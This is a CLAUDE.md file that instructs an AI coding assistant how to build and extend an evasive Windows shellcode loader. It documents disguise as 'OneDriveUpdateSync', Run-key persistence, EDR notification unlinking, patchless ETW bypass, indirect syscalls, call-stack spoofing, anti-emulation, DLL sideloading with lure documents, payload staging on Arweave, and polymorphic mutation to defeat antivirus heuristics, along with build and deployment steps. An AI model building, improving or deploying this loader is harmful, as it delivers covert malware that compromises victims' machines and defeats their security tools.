# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build Commands

```bash
# Step 1: Encrypt shellcode and generate Payload.h (required before every build)
# --wallet  Arweave wallet address (43-char base64url) embedded in Payload.h.
#           The binary only stores the wallet address — key and payload live on Arweave.
python Encrypt.py <shellcode.bin> --wallet <ARWEAVE_ADDRESS>
#   → produces: data.enc  (combined format: hex_key|hex_nonce|size|compressed|<binary>)
#               Payload.h (wallet address XOR-obfuscated, randomized strings/keys)

# Step 2: Upload data.enc to Arweave (wallet must hold AR tokens)
python arweave/upload.py data.enc [arweave/wallet.json]
#   → returns TX ID; confirmation takes 10-30 min
#   The loader finds the TX via GraphQL (owners filter + App-Name=zero-loader tag)
#   and extracts key/nonce from the embedded header — no rebuild needed after upload.

# Step 3a: Compile as EXE (default)
build.bat

# Step 3b: Compile as DLL sideload variant
python SideloadGen.py <target.dll> [--rename <new_name>] [--exe <host.exe>]
build.bat sideload [output_name.dll]

# Debug mode: uncomment '#define DEBUG' in Common.h before building
# Go/Sliver shellcode: uncomment '#define RWX_SHELLCODE' in Common.h
```

Build pipeline (EXE): `ml64 AsmStub.asm` → `cl *.c AsmStub.obj` → `python Mutate.py OneDriveUpdateSync.exe`

Build pipeline (DLL sideload): `SideloadGen.py <target.dll>` → `ml64 AsmStub.asm` → `cl /DBUILD_DLL *.c Sideload.c AsmStub.obj /DLL` → `python Mutate.py sideload.dll`

Compiler flags: `/O1 /GS- /NODEFAULTLIB /ENTRY:Main /SUBSYSTEM:WINDOWS` (EXE) or `/ENTRY:DllMain /DLL` (sideload).

## Architecture

CRT-free x64 Windows shellcode loader with polymorphic builds. Every run of `Encrypt.py` + `build.bat` produces a binary with a unique hash.

### Execution Flow (main.c)

```
IatCamouflage → AntiAnalysis → AntiEmulation
→ InitializeNtSyscalls (single-pass over ntdll exports, clean SSNs from \KnownDlls\ntdll.dll)
→ InitializeWinApis (case-insensitive PEB walk via FindLoadedModuleW)
→ BlindDllNotifications → ShufflePreloadLibraries (RDTSC Fisher-Yates order)
→ PatchlessEtw (VEH + HW breakpoints) → BruteForceDecryption
→ DownloadPayload → ChaskeyCtrDecrypt → [DecompressPayload]
→ NtAllocateVirtualMemory (private RW → copy → RX/RWX)
→ CleanupEvasion (remove VEH, wipe keys/URLs)
→ CollectCallGadgets (multi-module pool inc. dbgcore/dbghelp/dsdmo) → GetRandomCallGadget → SetSpoofTarget
→ ConvertThreadToFiber + CreateFiber(SpoofCallback) + SwitchToFiber   [primary: Poison Fiber]
  ↳ fallback: TpAllocWork(SpoofCallback) → TpPostWork → NtWaitForSingleObject(alertable)
```

Each step returns FALSE on failure and the loader exits silently. Anti-analysis is skipped when `DEBUG` is defined.

The primary kick-off is user-mode fibers on the main thread — no new OS thread is created, so `PsSetCreateThreadNotifyRoutine` kernel callbacks do not fire. If any fiber API fails (e.g. host already `ConvertThreadToFiber`-converted), the loader falls back to the thread-pool path, which is still call-stack spoofed. The fallback's keep-alive is an alertable `NtWaitForSingleObject` on the NtCurrentProcess pseudo-handle, producing `Wait:UserRequest` instead of `Wait:DelayExecution` to defeat Hunt-Sleeping-Beacons / BeaconHunter heuristics.

### Build Type Execution Flows

Two build types × two run types (first run vs persistence reboot). Both use a HKCU registry run key for persistence.

On **first run**: copy files → register persistence → launch persistence process → `NtTerminateProcess` (no download, no shellcode).
On **persistence reboot**: self-guard fires → skip install entirely → download → decrypt → shellcode.

---

#### EXE — `build.bat`

**First run** (dropper EXE, any IL):
```
Main() → evasion stack
→ InstallAndTerminate():
    self-guard: basename != "OneDriveUpdateSync.exe" → proceed
    InstallPersistence → HKCU\...\Run "OneDriveUpdateSync" = "%APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe"
    CreateDirectoryA %APPDATA%\OneDrive\Updates\
    CopyFileA self → OneDriveUpdateSync.exe
    CreateProcessW(OneDriveUpdateSync.exe)
    NtTerminateProcess(self)         ← exits here, never touches network
```

**Persistence reboot** (`OneDriveUpdateSync.exe`, HKCU run key fires at logon, medium IL):
```
Main() → evasion stack
→ InstallAndTerminate():
    self-guard: basename == "OneDriveUpdateSync.exe" → return immediately
→ FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
→ shellcode runs
```

---

#### Sideload — `build.bat sideload`

**First run** (host EXE loads proxy DLL, any IL):
```
DllMain → InstallExitHookPatchless (VEH + DR1 hardware BP on RtlExitUserProcess — patchless)
→ TpAllocWork(SideloadWorker) → host EXE continues normally
SideloadWorker:
  → LdrAddRefDll (pin proxy DLL)
  → OpenBindFile (open lure doc — no /pf in cmdline)
  → Main() → evasion stack
    → SideloadInstallAndContinue():
        self-guard: no /pf in cmdline → proceed
        InstallPersistence → HKCU\...\Run "OneDriveUpdateSync" = "%APPDATA%\OneDrive\Updates\OneDriveUpdateSync.exe /pf"
        CreateDirectoryA %APPDATA%\OneDrive\Updates\
        CopyFileA host EXE → OneDriveUpdateSync.exe
        CopyFileA *.dll    → dest dir
        CreateProcessW("OneDriveUpdateSync.exe /pf")
        NtTerminateProcess(self)     ← exits here, never touches network
```

**Persistence reboot** (`OneDriveUpdateSync.exe /pf`, HKCU run key fires at logon, medium IL):
```
DllMain → InstallExitHookPatchless (VEH+DR1) → TpAllocWork(SideloadWorker)
SideloadWorker:
  → LdrAddRefDll
  → OpenBindFile: /pf detected → skip lure
  → Main() → evasion stack
    → SideloadInstallAndContinue():
        self-guard: /pf in cmdline → return immediately
    → FetchArweaveMeta → download → decrypt → place shellcode → CleanupEvasion
    → shellcode runs
```

---

**Persistence summary by build type:**

| Build    | Registered on | Mechanism    | Key name               | IL at reboot |
|----------|---------------|--------------|------------------------|--------------|
| EXE      | First run     | HKCU Run key | `OneDriveUpdateSync`   | Medium       |
| Sideload | First run     | HKCU Run key | `OneDriveUpdateSync`   | Medium       |

### Module Responsibilities

- **Syscalls.h/.c + AsmStub.asm** — Indirect syscall engine with gadget pool randomization. `InitializeNtSyscalls` does a single pass over ntdll's export table (hashing each name once) and matches against the 5 target syscalls in one scan. SSN extraction (via `ResolveSyscallStub`) pattern-matches `4C 8B D1 B8 XX XX 00 00` and falls back to neighbouring stubs (±0x20) if hooked. Before target resolution, `SwitchToCleanNtdll` maps `\KnownDlls\ntdll.dll` as a SEC_IMAGE section via `NtOpenSection` + `NtMapViewOfSection` and repoints the export-table cache at that unhooked copy; the section handle is closed via `NtClose` so no zombie handle appears in `NtQuerySystemInformation(SystemHandleInformation)`. `CollectSyscallGadgets()` scans ntdll's executable sections for all `0F 05 C3` (syscall;ret) patterns and stores up to 64 in a pool. `GetRandomGadget()` picks one per call via `RDTSC`. `SET_SYSCALL()` configures SSN + random gadget before `RunSyscall()`. AsmStub also contains `SpoofCallback` (callback entry with optional RSP swap + call-gadget injection), `SetSpoofTarget(target, gadget)`, and `SetSpoofStack(syntheticRsp)`.
- **WinApi.c** — Shared PEB walker `FindLoadedModuleW(upperName)` finds a module by case-insensitive `BaseDllName` comparison; used for ntdll / kernel32 / kernelbase lookups (deduped from prior open-coded walks in WinApi / Sideload). `FetchModuleBaseAddr` provides a hash-based PEB walk for module base, `FetchExportAddress` resolves exports by JOAAT hash. Also provides CRT replacements (`memset`/`memcpy` via intrinsics), IAT camouflage, and `ShufflePreloadLibraries` (RDTSC Fisher-Yates preload of amsi/wininet/ktmw32 so subsequent `LoadLibraryA` calls hit the loader cache and emit no ETW image-load events in a predictable order).
- **Evasion.c** — Five evasion components: (1) `BlindDllNotifications` — removes all LdrRegisterDllNotification callbacks by registering a dummy callback, walking the doubly-linked list to find the sentinel head (inside ntdll address range), unlinking all EDR entries, then unregistering the dummy. Blinds EDR to subsequent LoadLibrary calls. (2) Patchless ETW bypass — VEH handler (`HwBpVehHandler`) + hardware breakpoint DR0=EtwEventWrite via `RtlCaptureContext` + `NtContinue` (avoids ETW-TI). VEH intercepts `STATUS_SINGLE_STEP` and returns STATUS_SUCCESS. Zero code bytes modified. (3) `CleanupEvasion()` — removes ETW VEH handler, clears DR0; on DLL builds preserves DR1 (exit hook) in the cleared context. (4) `InstallExitHookPatchless()` (BUILD_DLL only) — registers `ExitHookVehHandler` + sets DR1 hardware execute-BP on `RtlExitUserProcess` via `RtlCaptureContext`+`NtContinue`, called from DllMain. When the host calls ExitProcess, DR1 fires on that thread and the VEH spins it forever, keeping C2 comms alive. Zero ntdll bytes written (replaces byte-patch approach that triggered Win32/Bearfoos.B!ml). `PatchlessEtw` preserves DR1 when it sets DR0 (DR7 = L0+L1). (5) `AntiAnalysis` + `AntiEmulation` — PEB debugger flag, NtGlobalFlag, CPU count, RDTSC timing (AntiAnalysis); RDTSC determinism check + CPUID 0x40000000 hypervisor brand check + API hammering against mpengine's 200ms wall-clock budget (AntiEmulation). Both skipped in `DEBUG` builds.
- **Crypt.c** — Chaskey-12 ARX block cipher in CTR mode (replaces RC4/SystemFunction032). No S-boxes, no lookup tables, pure ALU — avoids RC4 signature detection. LZNT1 decompression via `RtlDecompressBuffer` (ntdll). Brute-forces 1 byte to recover the protected key using a known hint byte.
- **Staging.c** — HTTPS download via dynamically-loaded WinINet. URL parsing via `InternetCrackUrlA` (replaces manual parser). Self-signed cert bypass: first `HttpSendRequest` fails → set `SECURITY_FLAG_IGNORE_UNKNOWN_CA` on **same handle** → retry. Wipes URL/host data from stack after use.
- **Gadgets.c** — `CollectCallGadgets` harvests `FF D3` (call rbx) gadgets from ntdll, kernel32, kernelbase, plus `dbgcore.dll`, `dbghelp.dll`, and `dsdmo.dll` into a 64-entry pool; a per-run RDTSC pick (`GetRandomCallGadget`) selects the return-address anchor injected into the call stack, defeating "single-return-address frequency" heuristics. The extra three modules are unexpected by Elastic 9.x callstack signatures (Almond Offensive Security, 2025-11), which model gadget origins as primarily ntdll/kernel32/kernelbase. Adding "weird" gadget sources breaks return-address baselines without changing legitimacy of any individual frame.
- **Payload.h** — Auto-generated by `Encrypt.py`. Contains `#define` macros for XKEY_0..XKEY_3 (4-byte rotating XOR key), all XOR-encoded strings (`XSTR_*`), encoded URL (`INIT_ENCODED_URL`), protected Chaskey key (`INIT_PROTECTED_KEY`), Chaskey-CTR nonce (`INIT_CHASKEY_NONCE`), compression flag (`USE_COMPRESSION`), and Arweave wallet address (XOR-obfuscated). **Never edit manually.**
- **Sideload.c** — DLL sideloading entry point (compiled only with `BUILD_DLL`). `DllMain` finds ntdll via PEB walk, patches `RtlExitUserProcess` (prevents host exit killing C2), resolves `TpAllocWork`/`TpPostWork` using JOAAT hashes, and queues `SideloadWorker` to a thread pool thread. With `REQUIRE_ELEVATION`: worker checks admin via `NtQueryInformationToken`; if not elevated it relaunches the host EXE via `ShellExecuteA("runas")` then self-terminates. The elevated instance calls `SideloadInstallAndContinue` (file copy + HKCU run key), pins the DLL (`LdrAddRefDll`), opens the lure (`OpenBindFile`), and runs `Main()`. Without `REQUIRE_ELEVATION`: worker pins DLL, opens lure, and runs `Main()` directly. Deferred execution avoids Loader Lock; host application continues normally.
- **Sideload.h** — Auto-generated by `SideloadGen.py`. Contains `#pragma comment(linker, "/export:...")` directives that forward every export from the proxy DLL to the renamed original DLL. The PE loader handles forwarding natively — no proxy code runs for legitimate API calls. **Never edit manually.**
- **SideloadGen.py** — Parses a target DLL's PE export table (manual struct parsing, no external dependencies) and generates `Sideload.h` with export forwarding pragmas. Supports named exports and ordinal-only exports. Extracts and clones VS_VERSIONINFO into `Sideload.rc`. Usage: `python SideloadGen.py <target.dll> [--rename <name>] [--exe <host.exe>]`.

### Polymorphic Build System

`Encrypt.py` randomizes per run:
- **XKEY_0..XKEY_3** (4-byte rotating XOR key for DLL/API strings) — each byte picked from values that won't produce null bytes at its positions
- **Chaskey key** (16 random bytes) — protected with `(Key[i] + i) ^ random_byte`
- **Chaskey nonce** (12 random bytes) — stored directly in Payload.h
- **URL XOR key** — separate random key for staging URL
- **LZNT1 compression** — payload is compressed before encryption (via `RtlCompressBuffer`); decompressed at runtime via `RtlDecompressBuffer`

`Mutate.py` randomizes post-build:
- PE TimeDateStamp, Rich header, section padding, checksum
- Section alignment padding is filled with concatenated natural-language strings (Win32 API names, HTTP headers, registry paths, lorem ipsum) rather than `os.urandom` bytes. Entropy per byte drops from ~7.95 (looks packed/encrypted) into the 4.5-6.5 range typical of legitimate Win32 binaries, avoiding Defender ML / ESET / Sophos "high-entropy section" heuristics. Per-section pre/post entropy is printed at build time.

### Key Design Constraints

- **No CRT**: Uses `__movsb`/`__stosb` intrinsics. `memset`/`memcpy` are manually implemented in WinApi.c with `#pragma function()`. Stack frames must stay under 4096 bytes to avoid `__chkstk` dependency.
- **No kernel32 for execution**: Memory allocation/protection via indirect syscalls. Primary execution path is user-mode fibers on the main thread (`ConvertThreadToFiber` + `CreateFiber` + `SwitchToFiber`) — no new OS thread, so `PsSetCreateThreadNotifyRoutine` kernel callbacks don't fire. Fallback is the ntdll thread pool (`TpAllocWork`/`TpPostWork`), which also avoids `NtCreateThreadEx`. Waiting uses the alertable `NtWaitForSingleObject` indirect syscall (`Wait:UserRequest`) rather than `NtDelayExecution` (`Wait:DelayExecution`), defeating thread-state fingerprints.
- **W^X by default**: Memory is `PAGE_EXECUTE_READ` unless `RWX_SHELLCODE` is defined (needed for Go-based shellcode like Sliver that writes to its own pages).
- **Stack-based string decoding**: `DEOBF()` macro XOR-decodes byte arrays in place on the stack using a 4-byte rotating key. The null terminator `0x00` is stored raw (not encoded), so each key byte must not equal any character at its corresponding positions in the plaintext strings.
- **All WinINet/ktmw32 APIs resolved dynamically**: `LoadLibraryA` + `GetProcAddress` obtained via PEB hash walking, then used to resolve all other APIs. File I/O APIs (ReadFile, WriteFile, SetFilePointer) resolved via `FetchExportAddress` with JOAAT hashes.
- **Post-execution cleanup**: Keys, URLs, VEH handlers, and decoded strings are wiped from memory before shellcode execution to reduce forensic footprint.

### Compile-Time Flags (Common.h)

| Flag | Effect |
|------|--------|
| `DEBUG` | Enables debug logging to `debug.log` |
| `RWX_SHELLCODE` | Uses `PAGE_EXECUTE_READWRITE` for Go/Sliver shellcode |
| `BUILD_DLL` | DLL sideload build (set automatically by `build.bat sideload`) |
| `REQUIRE_ELEVATION` | DLL self-relaunch via `ShellExecuteA("runas")` before install |

### Hash Constants (Common.h)

Syscall and API function names are identified by JOAAT hashes, not strings. When adding a new syscall or API, compute the hash with `HashStringJenkinsOneAtATime32BitA()` and add the `#define` to Common.h.

### DLL Sideloading

DLL sideloading places a proxy DLL alongside a legitimate signed executable. When the host EXE runs, it loads the proxy DLL (thinking it's the real one). The proxy forwards all legitimate exports to the renamed original DLL via PE export forwarding, while the loader pipeline runs asynchronously on a thread pool thread.

```bash
# Step 1: Generate export forwarding for target DLL
python SideloadGen.py C:\Windows\System32\<target>.dll --exe <host>.exe

# Step 2: Encrypt shellcode (same as EXE build)
python Encrypt.py shellcode.bin --wallet <ARWEAVE_ADDRESS>

# Step 3: Build DLL
build.bat sideload <target>.dll
```

Deployment:
1. Rename the real `<target>.dll` to `<target>_orig.dll`
2. Place the built `<target>.dll` (proxy) alongside the host executable
3. Place `<target>_orig.dll` in the same directory
4. Upload the encrypted payload file (named after the URL basename, e.g. `payload.dat`) to the staging server
5. Run the host executable

DLL sideload execution flow:
```
Host EXE loads proxy DLL → DllMain (DLL_PROCESS_ATTACH)
→ PEB walk → find ntdll → InstallExitHookPatchless (VEH + DR1 on RtlExitUserProcess)
→ resolve TpAllocWork/TpPostWork → TpAllocWork(SideloadWorker) → TpPostWork → return TRUE
→ [Host app continues normally, ExitProcess blocked by exit hook]
→ SideloadWorker fires on thread pool:
  → [REQUIRE_ELEVATION] IsElevated? → no: ShellExecuteA "runas" + NtTerminateProcess self
  → [REQUIRE_ELEVATION] elevated instance: SideloadInstallAndContinue → LdrAddRefDll → Main()
  → [no REQUIRE_ELEVATION] LdrAddRefDll pin → Main()
→ [Full loader pipeline: evasion → download → decrypt → execute]
```

### Adding a New Obfuscated String

1. Add the plaintext to `OBFUSCATED_STRINGS` dict in `Encrypt.py`
2. Use the corresponding `XSTR_*` define in the C code: `BYTE x[] = XSTR_NAME; DEOBF(x);`
3. Re-run `Encrypt.py` to regenerate `Payload.h`
